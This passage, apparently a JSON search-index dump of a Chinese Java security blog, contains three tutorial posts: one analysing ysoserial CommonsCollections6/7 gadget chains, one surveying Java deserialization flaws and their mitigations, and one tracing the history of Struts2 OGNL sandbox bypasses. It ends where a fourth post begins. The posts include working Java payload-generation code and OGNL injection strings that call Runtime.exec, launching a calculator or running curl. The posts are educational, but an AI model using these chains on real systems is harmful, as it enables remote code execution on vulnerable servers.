(Object[]) f2.get(innimpl);\n//取出table里面的第一个Entry\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n        Field keyField = null;\n        try{\n            keyField = node.getClass().getDeclaredField(\"key\");\n        }catch(Exception e){\n            keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");\n        }\n//取出Entry对象重的key，并将它赋值为恶意的TiedMapEntry对象\n        Permit.setAccessible(keyField);\n        keyField.set(node, entry);\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(map);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\nCommonsCollections6的代码是最可以体现出使用反射机制生成恶意对象的优势的代码，我们看一下上面payload中使用反射机制的代码\n\n```java\n HashSet map = new HashSet(1);\n        map.add(\"foo\");\n        Field f = null;\n        try {\n            f = HashSet.class.getDeclaredField(\"map\");\n        } catch (NoSuchFieldException e) {\n            f = HashSet.class.getDeclaredField(\"backingMap\");\n        }\n//取出HashSet对象的成员变量map\n        Permit.setAccessible(f);\n        HashMap innimpl = (HashMap) f.get(map);\n        Field f2 = null;\n        try {\n            f2 = HashMap.class.getDeclaredField(\"table\");\n        } catch (NoSuchFieldException e) {\n            f2 = HashMap.class.getDeclaredField(\"elementData\");\n        }\n//取出HashMap对象的成员变量table\n        Permit.setAccessible(f2);\n        Object[] array = (Object[]) f2.get(innimpl);\n//取出table里面的第一个Entry\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n        Field keyField = null;\n        try{\n            keyField = node.getClass().getDeclaredField(\"key\");\n        }catch(Exception e){\n            keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");\n        }\n//取出Entry对象重的key，并将它赋值为恶意的TiedMapEntry对象\n        Permit.setAccessible(keyField);\n        keyField.set(node, entry);\n```\n\n上面给出的这么一长串代码，其实如果不使用反射机制去生成恶意对象，只需要两行代码\n\n```java\n        HashSet map = new HashSet(1);\n        map.add(entry);\n```\n\n两个代码生成的map对象是一摸一样的对象，但是使用第二种方式，你会发现在反序列化的时候无法造成RCE（第二种同样会造成RCE但是是发生在map.add的时候而不是ois.readObject()的时候），原因就出在了lazyMap类的get函数处，\n\n![img19.jpg](/images/a7/19.png)\n\n触发RCE的关键就在于this.factory.transform(key)，然而想走到这一步，需要一个条件：!this.map.containsKey(key)，翻译一下就是加载的这个key之前未被get函数调用过，并且一旦调用过一次后，就会直接把这个key-value对放进this.map中，下次调用直接走else语句，而不会再去调用this.factory.transform(key)。\n\n这样的话，当我们通过map.add(entry)的方式去生成恶意HashSet对象的时候，看一下add方法的调用栈\n\n![img20.jpg](/images/a7/20.png)\n\nadd方法本身就会调用LazyMap的get方法，这样的话，我们需要造成RCE的map在还没进行反序列化的时候，就已经被put到this.map中去了，到了反序列化企图造成rce的时候，调用 LazyMap的get方法，不会再去走if语句而走到else里面去了，从而无法造成命令执行。\n\n当然这种情况并不是无解的，我们可以将上述两行代码中做一下修改变成这种形式，\n\n```java\n        HashSet map = new HashSet(1);\n        map.add(entry);\n        lazyMap.remove(\"foo\");\n```\n\n就是记得把lazyMap中的this.map记得删除一下就完事了，也很简单~~~\n\n现在我们去看一下使用反射机制生成恶意对象从而在反序列化后造成RCE的调用链，\n\n![img21.jpg](/images/a7/21.png)\n\n调用HashSet的readObject方法进行反序列化，将恶意的TiedMapEntry对象带入put函数，\n\n![img22.jpg](/images/a7/22.png)\n\n在put函数中会把恶意的TiedMapEntry对象放入hash函数中，\n\n![img23.jpg](/images/a7/23.png)\n\n在hash函数中调用了恶意的TiedMapEntry对象的hashCode函数\n\n![img24.jpg](/images/a7/24.png)\n\n在hashCode函数中会调用恶意的TiedMapEntry对象自身的getValue函数\n\n![img25.jpg](/images/a7/25.png)\n\n在getValue函数中调用this.map的get函数\n\n![img26.jpg](/images/a7/26.png)\n\n在get函数中调用恶意TiedMapEntry的恶意factory对象的tranform方法，从而造成rce，这里面可以看到这个时候this.map是空的，所以我们能成功进入到if语句中。\n\n![img27.jpg](/images/a7/27.png)\n\n因为这个payload也是用到了InvokerTransformer类的，所以修复方案和第一个payload是一样的。\n\n# CommonsCollections7\n\n**适用版本**：3.1-3.2.1，jdk1.7,1.8均可成功\n\nCommonsCollections7也是一个适用性比较好的payload，在多种版本jdk中都可以执行成功，它的坑点和CommonsCollections6都有着一定的相似性。可以窥探到当把lazyMap作为key传入到hashset或者hashtable的时候往往都会对lazyMap本身的map参数造成一定影响，而这种影响很容易导致rce的失败。\n\n看一下代码，关键的两步我都在代码里面加上了注释，\n\n```java\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final String[] execArgs = new String[]{command};\n        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n        final Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",\n                        new Class[]{String.class, Class[].class},\n                        new Object[]{\"getRuntime\", new Class[0]}),\n                new InvokerTransformer(\"invoke\",\n                        new Class[]{Object.class, Object[].class},\n                        new Object[]{null, new Object[0]}),\n                new InvokerTransformer(\"exec\",\n                        new Class[]{String.class},\n                        execArgs),\n                new ConstantTransformer(1)};\n        Map innerMap1 = new HashMap();\n        Map innerMap2 = new HashMap();\n        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);\n        lazyMap1.put(\"yy\", 1);\n        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);\n        lazyMap2.put(\"zZ\", 1);\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(lazyMap1, 1);\n        //开启调试模式去跟一下hashtable.put(lazyMap2, 2)这个代码执行后的变量变化，会发现会发现lazyMap2的map内多了一个 yy->yy的map\n        hashtable.put(lazyMap2, 2);\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        //这一步正是为了删除在hashtable.put(lazyMap2, 2)后lazyMap2中多出的那个yy->yy的map\n        lazyMap2.remove(\"yy\");\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(hashtable);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n这个代码的坑就在于当调用hashtable.put(lazyMap2, 2)的时候会因为put函数的一系列操作把lazyMap2变成了我们不期望的模样，\n\n![img28.jpg](/images/a7/28.png)\n\n可以看到lazyMap中的map多了一个yy->yy，其实一旦出现这种情况我们就知道肯定和lazyMap的get函数有关，打个断点看一下什么情况，\n\n![img29.jpg](/images/a7/29.png)遇到这种情况处理起来也很简单，lazyMap2.remove(“yy”)就完事了。\n\nOK，明白了payload的生成代码，接下来我们就去看一下反序列化时候的利用链，\n\n![img30.jpg](/images/a7/30.png)\n\n在Hashtable的readObject方法中会把每个key-value往table里面丢，\n\n![img31.jpg](/images/a7/31.png)\n\n从往table中丢第二个map的时候，就需要开始让它的key和之前的key进行对比，看看有没有重复以决定是新添加一个map还是覆盖原有的，\n\n![img32.jpg](/images/a7/32.png)\n\n然后经过两个equals函数后自然而然的要去调用对于map的get函数以获取值，以做修改，于是就又来到了我们熟悉额lazyMap的get函数，从而调用tranform方法导致了RCE,\n\n![img33.jpg](/images/a7/33.png)\n\n# 总结\n\n通过对ysoserial中关于CommonsCollection的七个利用方式的分析我们可以对可以利用的恶意类做一个总结：\n\n## 四大Tranformer的tranform方法的作用\n\n> **1.ChainedTransformer：**循环调用成员变量iTransformers数组的中ransformer中的tranform方法。\n>\n> **2.InvokerTransformer：** 通过反射的方法调用传入tranform方法中的inuput对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）\n>\n> **3.ConstantTransformer：**返回成员变量iConstant的值。\n>\n> **4.InstantiateTransformer：**通过反射的方法返回传入参数input的实力。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）\n\n## 三大Map的作用\n\n> **1.lazyMap：**通过调用lazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。\n>\n> **2.TiedMapEntry：**通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和lazyMap配合使用。\n>\n> **3.HashMap：**通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。\n\n## 五大反序列化利用基类\n\n> **1.AnnotationInvocationHandler：**反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。\n>\n> **2.PriorityQueue：**反序列化的时候会调用TransformingComparator中的transformer的tranform方法，用来直接和Tranformer配合使用。\n>\n> **3.BadAttributeValueExpException：**反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。\n>\n> **4.HashSet：**反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。\n>\n> **5.Hashtable：**当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和lazyMap配合使用。\n\n\n\n**参考：**\n\nhttp://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/\n\nhttp://www.vuln.cn/6295\n\nhttps://www.freebuf.com/articles/web/214096.html\n\n[https://badcode.cc/2018/03/15/Java反序列化之Commons-Collections/](https://badcode.cc/2018/03/15/Java反序列化之Commons-Collections/)\n\n","tags":["反序列化","CommonsCollections","gadget"],"categories":["JAVA安全教程"]},{"title":"JAVA反序列化漏洞总结","url":"/2019/02/15/JAVA反序列化漏洞总结/","content":"本文本人首发自https://www.secpulse.com/archives/95012.html\n\n## 前言\n\n### 什么是序列化和反序列化\n\nJava 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。反序列化就是通过序列化后的字段还原成这个对象本身。但标识不被序列化的字段是不会被还原的。\n\n\n\n### 序列化有什么用\n\n1）网站相应的session对象存储在硬盘上，那么保存在session中的内容就必须实现相关的序列化操作。\n\n2）如果使用的java对象要在分布式中使用或者在rmi远程调用的网络中使用的话，那么相关的对象必须实现java序列化接口。\n\n \n\n## Java反序列化类型\n\n我们最常见就是原生的java反序列化类型，其实java中有几种方式可以执行反序列化，本文目的也是对这几种类型的反序列化方法进行归纳和总结。\n\n### 1、 Java原生序列化\n\nJava包中自带的类InputStream和OutputStream，它们之间可以互相转化，使用writeObject序列化，使用readObject反序列化。\n\n```java\nimport java.io.*;\n \npublic class DeserializeDemo\n{\n   public static void main(String [] args)\n   {\n      Employee e = null;\n      try\n      {\n         FileInputStream fileIn = new FileInputStream(\"/tmp/employee.ser\");\n         ObjectInputStream in = new ObjectInputStream(fileIn);\n         e = (Employee) in.readObject();\n         in.close();\n         fileIn.close();\n      }catch(IOException i)\n      {\n         i.printStackTrace();\n         return;\n      }catch(ClassNotFoundException c)\n      {\n         System.out.println(\"Employee class not found\");\n         c.printStackTrace();\n         return;\n      }\n      System.out.println(\"Deserialized Employee...\");\n      System.out.println(\"Name: \" + e.name);\n      System.out.println(\"Address: \" + e.address);\n      System.out.println(\"SSN: \" + e.SSN);\n      System.out.println(\"Number: \" + e.number);\n    }\n}\n```\n\n### 2、 Json反序列化\n\nJson序列化一般会使用jackson包，通过ObjectMapper类来进行一些操作，比如将对象转化为byte数组或者将json串转化为对象。\n\n```java\npublic static <T> String serialize(T t) throws JsonProcessingException {\n        ObjectMapper mapper = new ObjectMapper();\n        String jsonResult = mapper.writerWithDefaultPrettyPrinter()\n                .writeValueAsString(t);\n        return jsonResult;\n    }\n```\n\n### 3、 Fastjson反序列化\n\nFastjson是一个性能很好的Java语言实现的Json解析器和生成器，由来自阿里巴巴的工程师开发。具有极快的性能，超越任何其他的Java Json Parser。Fastjson使用parseObject来进行反序列化。\n\n```java\nimport com.alibaba.fastjson.JSON;    \n  \npublic class Person {  \n    int age;  \n    String name;  \n    public int getAge() {  \n        return age;  \n    }  \n    public void setAge(int age) {  \n        this.age = age;  \n    }  \n    public String getName() {  \n        return name;  \n    }  \n    public void setName(String name) {  \n        this.name = name;  \n    }  \n    public static void main(String[] args) {  \n        String jsonString=\"{\\\"name\\\":\\\"hah\\\",\\\"age\\\":1}\";  \n        Person person = JSON.parseObject(jsonString, Person.class);  \n        System.out.println(1);  \n    }  \n}  \n```\n\n### 4、Protobuf 反序列化\n\nProtocol Buffers 是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或 RPC 数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。目前提供了 C++、Java、Python 三种语言的 API。\n\n**proto.proto文件内容**\n\n```java\npackage proto;\n\nmessage TestMsg{\n    optional string id = 1;\n    optional string name = 2;\n}\n```\n\n**序列化**\n\n```java\npublic byte[] build(){\n    Proto.TestMsg.Builder builder = Proto.TestMsg.newBuilder();\n    builder.setId(\"ID的值\");\n    builder.setName(\"Name的值\");\n    Proto.TestMsg msg = builder.build();\n\n    return msg.toByteArray();\n}\n```\n\n**反序列化**\n\n```java\nProto.TestMsg msg = Proto.TestMsg.parseFrom(message.returnByte());\nSystem.out.Println(msg);\n```\n\n \n\n## 各方式反序列化比较\n\n![img](/images/a6/1.png)\n\n \n\n## 各序列化漏洞简介\n\n除了使用protobuf进行反序列化没有出现过漏洞，其他方式的序列化都曾出现过漏洞。下面将简单介绍下漏洞，详细的漏洞和exp构造方法大家可以去网上搜索关键字查看（java几个反序列化漏洞exp构造过程都十分精彩，推荐大家认真阅读下）\n\n### 1、Object Serialize 漏洞\n\nApache Commons Collections中实现了TransformedMap ，该类可以在一个元素被添加/删除/或是被修改时(即key或value：集合中的数据存储形式即是一个索引对应一个值，就像身份证与人的关系那样)，会调用transform方法自动进行特定的修饰变换。\n\n![img](/images/a6/2.png)\n\nTransformedMap.decorate方法，预期是对Map类的数据结构进行转化，该方法有三个参数。\n\n- 第一个参数为待转化的Map对象\n- 第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）\n- 第三个参数为Map对象内的value要经过的转化方法\n\n通过对第三个参数通过构造ChainedTransformer链，通过一系列变化，最终执行系统命令。\n\n### 2、Jackson-databind 漏洞\n\nJackson是一套开源的java序列化与反序列化工具框架，可将java对象序列化为xml和json格式的字符串及提供对应的反序列化过程。由于其解析效率较高，目前是Spring MVC中内置使用的解析方式，该漏洞的触发条件是ObjectMapper反序列化前调用了enableDefaultTyping方法。该方法允许json字符串中指定反序列化java对象的类名，而在使用Object、Map、List等对象时，可诱发反序列化漏洞，导致可执行任意命令。\n\n### 3、FastJson 漏洞\n\nfastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并通过json来填充其属性值。而JDK自带的类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中有一个私有属性_bytecodes，其部分方法会执行这个值中包含的Java字节码。通过注入恶意代码到_bytecode，导致任意代码执行漏洞。\n\n**注：**Fastjson和Jackson Payload构造的方式都一样，虽然解析函数不一样，但是都是将json转为object，过程是类似的。\n\n\n\n## 防止反序列化漏洞\n\n### 1、Java Serialization\n\n- jdk里增加了一个filter机制 [http://openjdk.java.net/jeps/290 ](http://openjdk.java.net/jeps/290 )，这个一开始是出现在jdk9上的，后面移值回jdk6/7/8上，如果安装的jdk版本是比较新的，可以找到相关的类\n- Oracle打算废除java序列化：https://www.infoworld.com/article/3275924/java/oracle-plans-to-dump-risky-java-serialization.html\n\n### 2、jackson-databind\n\n- jackson-databind里是过滤掉一些已知的类，参见[SubTypeValidator.java](https://github.com/FasterXML/jackson-databind/blob/jackson-databind-2.9.6/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java)\n- jackson-databind的[CVE issue列表](https://github.com/FasterXML/jackson-databind/issues?q=is%3Aissue+label%3ACVE+is%3Aclosed)\n\n### 3、fastjson\n\n- fastjson通过一个denyList来过滤掉一些危险类的package，参见[ParserConfig.java](https://github.com/alibaba/fastjson/blob/1.2.7.sec01/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L169)\n- fastjson在新版本里denyList改为通过hashcode来隐藏掉package信息，但通过这个[DenyTest5](https://github.com/alibaba/fastjson/blob/1.2.47/src/test/java/com/alibaba/json/bvt/parser/deser/deny/DenyTest5.java)可以知道还是过滤掉常见危险类的package\n- fastjson在新版本里默认把autoType的功能禁止掉了\n\n**这些序列化漏洞的根本原因是：没有控制序列化的类型范围。**\n\n仔细看的读者会发现并没有提及protobuf的反序列化漏洞，为什么在protobuf里并没有这些反序列化问题？\n\n- protobuf在IDL里定义好了package范围\n- protobuf的代码都是自动生成的，怎么处理二进制数据都是固定的\n\nprotobuf把一切都框住了，少了灵活性，自然就少漏洞。\n\n**注：**IDL（Interface description language）文件：参与通讯的各方需要对通讯的内容需要做相关的约定（Specifications）。为了建立一个与语言和平台无关的约定，这个约定需要采用与具体开发语言、平台无关的语言来进行描述。这种语言被称为接口描述语言（IDL），采用IDL撰写的协议约定称之为IDL文件。\n\n\n\n## 总结：\n\n本文总结了java反序列化的几种方式，并回顾了java几个经典的漏洞以及对应的修复方案，希望通过本文，大家对java反序列化漏洞有更深刻的认知。\n\n \n\n**参考链接：**\n\nhttp://hengyunabc.github.io/thinking-about-grpc-protobuf/\n\nhttps://blog.csdn.net/u011721501/article/details/78555246\n\nhttps://www.freebuf.com/sectool/165655.html\n\nhttps://www.cnblogs.com/he1m4n6a/p/10131566.html\n\n[https://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/](https://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/)\n\nhttps://www.jianshu.com/p/e9e631285cb0","tags":["JAVA","反序列化"],"categories":["JAVA安全教程"]},{"title":"OGNL攻防史","url":"/2019/02/13/OGNL攻防史/","content":"# 前言\n\n之前基础篇对struts2的框架做了介绍，本篇章将对struts2的原理做个简介。目前struts2已经被阿里巴巴等大厂弃用了，但是作为曾经风靡一时的框架，并且互联网上还有大量的struts2应用，是很有必要学习一番的。\n\n# OGNL表达式\n\nOGNL（Object Graph Navigation Language）即对象图形导航语言，是一个开源的表达式引擎。使用OGNL，你可以通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化。如果我们把表达式看做是一个带有语义的字符串，那么OGNL无疑成为了这个语义字符串与Java对象之间沟通的桥梁。我们可以轻松解决在数据流转过程中所遇到的各种问题。\n\n## OGNL三要素\n\n**Expression(表达式)：**\n\nExpression规定OGNL**要做什么**，其本质是一个带有语法含义的字符串,这个字符串将规定操作的类型和操作的内容。OGNL支持的语法非常强大，从对象属性、方法的访问到简单计算，甚至支持复杂的lambda表达式。\n\n**Root(根对象)：**\n\nOGNL的root对象可以理解为OGNL要操作的对象，表达式规定OGNL要干什么，root则指定对**谁进行操作**。OGNL的root对象实际上是一个java对象，是所有OGNL操作的实际载体。\n\n**Context(上下文)：**\n\n有了表达式和根对象，已经可以使用OGNL的基本功能了。例如，根据表达式对root对象进行getvalue、setvalue操作。不过事实上在OGNL内部，所有的操作都会在一个特定的数据环境中运行，这个数据环境就是OGNL的上下文。**单说就是上下文将规定OGNL的操作在哪里进行。**OGNL的上下文环境是一个MAP结构，定义为OgnlContext，root对象也会被添加到上下文环境中，作为一个特殊的变量进行处理。\n\nOGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值：\n\n![](/images/a5/1.png)\n\nsetValue通过传入的OGNL表达式，在给定的上下文环境中，往root对象里写值:\n\n![](/images/a5/2.png)\n\n## OGNL基本操作\n\n1. 支持对象方法调用，形式如：objName.methodName()；\n\n2. 支持类静态的方法调用和值访问，表达式的格式为 **@[类全名（包括包路）]@[方法名 | 值名]**，例如：\n\n```java\n@java.lang.String@add（ '11' , 'hahhaha' ）\n```\n\n3. 支持赋值操作和表达式串联，例如：\n\n```java\nnumber=18, price=100,Total()；\n```\n\n那么返回1800；\n\n4. 访问OGNL上下文（OGNL context）其实就是Map （教室、老师、学生）和ActionContext，\n\n   - OgnlContext=根对象(1)+非根对象(N)\n\n     - 老师：根对象 1\n\n     - 学生：非根对象 n\n\n       非根对象要通过**#key**访问，根对象可以省略**#key**\n\n   - **根对象和非根对象的概括**\n\n     - 一个上下文中只有一个根对象\n     - 取跟对象的值，只需要直接通过根对象属性即可\n     - 非根对象取值必须通过指定的上下文容器中的**#key**属性去取。\n\n# OGNL历史\n\nOgnlContext中的_memberAccess与securityMemberAccess是同一个SecurityMemberAccess类的实例，而且内容相同，也就是说全局的OgnlUtil实例都共享着相同的设置。如果利用OgnlUtil更改了设置项（excludedClasses、excludedPackageNames、excludedPackageNamePatterns）则同样会更改_memberAccess中的值。\n\n以下图例左边都是较为新的版本，右边为老版本。\n\n## Struts 2.3.14.1版本前\n\nS2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于SecurityMemberAccess：\n\n![](/images/a5/3.png)\n\n左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改allowStaticMethodAccess=true，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：\n\n```java\n(#_memberAccess[‘allowStaticMethodAccess’]=true).(@java.lang.Runtime@getRuntime().exec(‘calc’))\n```\n\n而在2.3.14.1版本后将allowStaticMethodAccess设置成**final属性**后，就不能显式更改了，这样的poc显然也失效了。\n\n## Struts 2.3.20版本前\n\n在2.3.14.1后虽然不能更改allowStaticMethodAccess了，但是还是可以通过_memberAccess使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：\n\n```java\n(#p=new java.lang.ProcessBuilder(‘xcalc’)).(#p.start())\n```\n\n直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用ProcessBuilder这个payload了。\n\n## Struts 2.3.29版本前\n\n左为2.3.29版本，右边为2.3.28版本\n\n![](/images/a5/4.png)\n\n从黑名单中可以看到禁止使用了ognl.MemberAccess和ognl.DefaultMemberAccess，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用_memberAccess调用静态对象DefaultMemberAccess，然后用DefaultMemberAccess覆盖_memberAccess。那么为什么说这样就可以使用静态方法了呢？ 我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：\n\n```java\n(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))\n```\n\n我们来看一下ognl.OgnlContext@DEFAULT_MEMBER_ACCESS：\n\n![](https://p5.ssl.qhimg.com/t01ecfd1c68ebe3f988.jpg)\n\n看过上一节的都知道，在程序运行时在setOgnlUtil方法中将黑名单等数据赋给SecurityMemberAccess，而这就是创建_memberAccess的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而SecurityAccess这个对象的父类本身就是ognl.DefaultMemberAccess，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类DefaultMemberAccess覆盖_memberAccess中的内容，就相当于初始化了_memberAccess，这样就可以绕过其之前所设置的黑名单以及限制条件。\n\n## Struts 2.3.30+/2.5.2+\n\n到了2.3.30(2.5.2)之后的版本，我们可以使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：\n\n```java\n(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))\n```\n\n可以看到绕过的关键点在于：\n\n- 利用Ognl执行流程利用container获取了OgnlUtil实例\n- 清空了OgnlUtil$excludedClasses黑名单，释放了DefaultMemberAccess\n- 利用setMemberAccess覆盖\n\n而具体的流程可以参考2.2的内容。\n\n## Struts 2.5.16\n\n分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：\n\n- 2.5.13版本后禁止访问coontext.map\n\n- 准确来说是ognl包版本的区别，在2.5.13中利用的是3.1.15版本，在2.5.12版本中使用的是3.1.12版本：\n- ![](/images/a5/6.png)\n- 而这个改变是在OgnlContext中：\n- ![](/images/a5/7.png)\n- 不只是get方法，put和remove都没有办法访问了，所以说从根本上禁止了对context.map的访问。\n\n- 2.5.20版本后excludedClasses不可变了，具体的代码在[这里](https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca)\n\n所以在S2-045时可使用的payload已经没有办法再使用了，需要构造新的利用方式。\n\n文章提出了这么一种思路:\n\n- 没有办法使用context.map，可以调用attr，前文说过attr中保存着整个context的变量与方法，可以通过attr中的方法返回给我们一个context.map。\n- 没有办法直接调用excludedClasses，也就不能使用clear方法来清空，但是还可以利用setter来把excludedClasses给设置成空\n- 清空了黑名单，我们就可以利用DefaultMemberAccess来覆盖_memberAccess，来执行静态方法了。\n\n而这里又会出现一个问题，当我们使用OgnlUtil的setExcludedClasses和setExcludedPackageNames将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说_memberAccess是源数据的一个引用，就像前文所说的，在每次createAction时都是通过setOgnlUtil利用全局的源数据创建一个引用，这个引用就是一个MemberAccess对象，也就是_memberAccess。所以这里只会影响这次请求的OgnlUtil而并未重新创建一个新的_memberAccess对象，所以旧的_memberAccess对象仍未改变。\n\n而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的OgnlUitl作为源重新创建一个_memberAccess，这样在第二次请求中_memberAccess就是黑名单被置空的情况，这个时候就释放了DefaultMemberAccess，就可以进行正常的覆盖以及执行静态方法。\n\npoc为：\n\n```java\n(#context=#attr[‘struts.valueStack’].context).(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(”)).(#ognlUtil.setExcludedPackageNames(”))\n\n(#context=#attr[‘struts.valueStack’].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘curl 127.0.0.1:9001’))\n```\n\n# 现阶段的OGNL\n\nStruts2在 2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。\n\n## 2.5.17的改变（限制命名空间）\n\n1. 黑名单的变动，禁止访问com.opensymphony.xwork2.ognl.\n<img src=\"/images/a5/8.png\" style=\"zoom:50%;\" />\n- 讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了com.opensymphony.xwork2.ognl.也就是说我们根本没办法访问这个Struts2重写的ognl包了。\n\n2. 切断了动态引用的方式，需要利用构造函数生成\n![](/images/a5/9.png)\n- 不谈重写了setExcludedClasses和setExcludedPackageNamePatterns，单单黑名单的改进就极大的限制了利用。\n\n## 2.5.19的改进\n\n1. ognl包的升级，从3.1.15升级到3.1.21\n![](/images/a5/10.png)\n\n2. 黑名单改进\n![](/images/a5/11.png)\n\n3. 在OgnlUtil中setXWorkConverter、setDevMode、setEnableExpressionCache、setEnableEvalExpression、setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames、setContainer、setAllowStaticMethodAccess、setDisallowProxyMemberAccess都从public方法变成了protected方法了：\n\n<img src=\"/images/a5/12.png\" style=\"zoom:50%;\" />\n<img src=\"/images/a5/13.png\" style=\"zoom:50%;\" />\n\n也就是说没有办法显式调用setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames了。\n\n## master分支的改变\n\n1. ognl包的升级，从3.1.21升级到3.2.10，直接删除了DefaultMemberAccess.java，同时删除了静态变量DEFAULT_MEMBER_ACCESS，并且_memberAccess变成了final：\n\n<img src=\"/images/a5/14.png\" style=\"zoom:50%;\" />\n<img src=\"/images/a5/15.png\" style=\"zoom:50%;\" />\n\n2. SecurityMemberAccess不再继承DefaultMemberAccess而直接转为MemberAccess接口的实现：\n<img src=\"/images/a5/16.png\" style=\"zoom:50%;\" />\n\n可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，DefaultAccess彻底退出了历史舞台意味着利用父类覆盖_memberAccess的利用方式已经无法使用，而黑名单对于com.opensymphony.xwork2.ognl的限制导致我们基本上没有办法利用Ognl本身的API来更改黑名单，同时_memberAccess变为final属性也使得S2-057的这种利用_memberAccess暂时性的特征而进行“重放攻击”的方式测地化为泡影。\n\n\n\n参考：\n\nhttps://blog.csdn.net/pngyul/article/details/82723719\n\nhttps://www.anquanke.com/post/id/169735#h3-4\n\nhttps://www.cnblogs.com/huangting/p/11105051.html","tags":["OGNL","Struts2"],"categories":["JAVA安全教程"]},{"title":"JAVA常见WEB漏洞审计","url":"/2019/02/02/JAVA常见WEB漏洞审计/","content":"# 简介\n\n本篇将介绍java 